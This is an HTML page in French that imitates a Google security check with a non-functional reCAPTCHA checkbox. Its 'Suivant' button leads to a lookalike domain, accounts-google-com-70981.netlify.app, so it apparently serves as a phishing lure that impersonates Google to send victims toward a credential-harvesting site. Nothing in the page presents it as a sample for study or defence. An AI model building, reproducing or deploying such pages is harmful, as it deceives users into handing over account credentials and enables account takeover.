<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de sécurité - Google</title>
    <style>
        :root {
            --blue: #1a73e8;
            --dark-blue: #1765cc;
            --gray: #5f6368;
            --light-gray: #f1f3f4;
            --border-gray: #dadce0;
        }
        
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            line-height: 1.5;
        }
        
        .header {
            padding: 16px 24px;
        }
        
        .back-button {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .back-button:hover {
            background-color: var(--light-gray);
        }
        
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            padding: 40px 40px 36px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: var(--gray);
            margin-bottom: 32px;
        }
        
        .recaptcha-container {
            border: 1px solid var(--border-gray);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 24px;
        }
        
        .recaptcha-header {
            background-color: #f5f5f5;
            padding: 16px;
            border-bottom: 1px solid var(--border-gray);
            display: flex;
            align-items: center;
        }
        
        .recaptcha-logo {
            width: 24px;
            height: 24px;
            margin-right: 12px;
        }
        
        .recaptcha-content {
            padding: 24px;
            text-align: center;
            background-color: white;
        }
        
        .recaptcha-checkbox {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 24px;
            height: 24px;
            border: 2px solid var(--border-gray);
            border-radius: 4px;
            margin-right: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .recaptcha-checkbox.checked {
            background-color: var(--blue);
            border-color: var(--blue);
        }
        
        .recaptcha-row {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }
        
        .recaptcha-text {
            font-size: 16px;
        }
        
        .recaptcha-footer {
            font-size: 12px;
            color: var(--gray);
            padding: 16px;
            background-color: #f5f5f5;
            border-top: 1px solid var(--border-gray);
            display: flex;
            justify-content: space-between;
        }
        
        .recaptcha-footer a {
            color: var(--blue);
            text-decoration: none;
        }
        
        .recaptcha-footer a:hover {
            text-decoration: underline;
        }
        
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .next-button {
            background-color: var(--blue);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .next-button:hover {
            background-color: var(--dark-blue);
            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
        }
        
        .next-button:disabled {
            background-color: #f1f3f4;
            color: #bdc1c6;
            cursor: default;
            box-shadow: none;
        }
        
        .audio-button {
            color: var(--blue);
            background: none;
            border: none;
            font-size: 14px;
            cursor: pointer;
            padding: 8px;
        }
        
        .audio-button:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="back-button">
            <svg viewBox="0 0 24 24" fill="#5f6368" width="24" height="24">
                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
            </svg>
        </div>
    </div>
    
    <div class="container">
        <div class="card">
            <h1>Vérification de sécurité</h1>
            <p class="subtitle">Pour protéger votre compte, veuillez confirmer que vous n'êtes pas un robot</p>
            
            <div class="recaptcha-container">
                <div class="recaptcha-header">
                    <svg class="recaptcha-logo" viewBox="0 0 24 24" fill="#4285F4">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"/>
                        <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z"/>
                    </svg>
                    <span>reCAPTCHA</span>
                </div>
                
                <div class="recaptcha-content">
                    <div class="recaptcha-row">
                        <div class="recaptcha-checkbox" id="checkbox" onclick="toggleCheckbox()">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" id="checkmark">
                                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="white"/>
                            </svg>
                        </div>
                        <span class="recaptcha-text">Je ne suis pas un robot</span>
                    </div>
                    
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="32" height="32">
                    <p>Confidentialité - Conditions</p>
                </div>
                
                <div class="recaptcha-footer">
                    <a href="#">Version audio</a>
                    <a href="#">Aide</a>
                </div>
            </div>
            
            <div class="button-container">
                <button class="audio-button">Choisir une autre méthode</button>
                <a href="https://accounts-google-com-70981.netlify.app" class="next-button" id="nextButton" disabled>Suivant</a>
            </div>
        </div>
    </div>

    <script>
        function toggleCheckbox() {
            const checkbox = document.getElementById('checkbox');
            const nextButton = document.getElementById('nextButton');
            
            checkbox.classList.toggle('checked');
            
            if (checkbox.classList.contains('checked')) {
                nextButton.removeAttribute('disabled');
            } else {
                nextButton.setAttribute('disabled', 'true');
            }
        }
    </script>
</body>
</html>
